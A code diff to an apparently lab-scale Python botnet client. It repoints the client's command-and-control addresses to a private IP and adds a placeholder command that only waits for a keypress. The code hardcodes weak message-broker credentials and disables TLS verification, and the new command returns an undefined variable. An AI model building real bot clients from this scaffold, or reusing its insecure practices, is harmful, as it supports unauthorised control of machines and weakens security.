@@ -14,14 +14,14 @@ class Client():
     def __init__(self):
         self.bot_registration_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.bot_registration_address = ('192.168.0.105', 5582)
-        self.commands = {1: self.command1, 2: self.command2}
+        self.commands = {1: self.command1, 2: self.command2, 3: self.command3}
         self.event_controller = threading.Event()
         self.botnet_id = 0
         self.bot_id = 0
         self.botnet_job_id = 0
         # TODO: unsafe credentials
         self.credentials = pika.PlainCredentials('user', 'user')
-        self.parameters = pika.ConnectionParameters('192.168.0.112', 5672, '/', self.credentials)
+        self.parameters = pika.ConnectionParameters('192.168.0.114', 5672, '/', self.credentials)
         self.connection = pika.BlockingConnection(self.parameters)
 
 
@@ -87,7 +87,7 @@ class Client():
 
     def finish_command(self, result):
         self.event_controller.clear()
-        url = "https://192.168.0.112:45455/api/v1/BotnetJob/" + str(self.botnet_job_id)
+        url = "https://192.168.0.114:45455/api/v1/BotnetJob/" + str(self.botnet_job_id)
         requests.delete(url=url, verify=False)
         self.botnet_job_id = 0
 
@@ -120,6 +120,14 @@ class Client():
         for i in range(3):
             print(f"Iteration {i}")
             time.sleep(1)
+        print("Command finished")
+        return (True, result)
+
+    @command_wrapper
+    def command3(self, command_args):
+        print("Command 3 started")
+        print("Press a key to finish...")
+        input(">")
         print("Command finished")
         return (True, result)
 
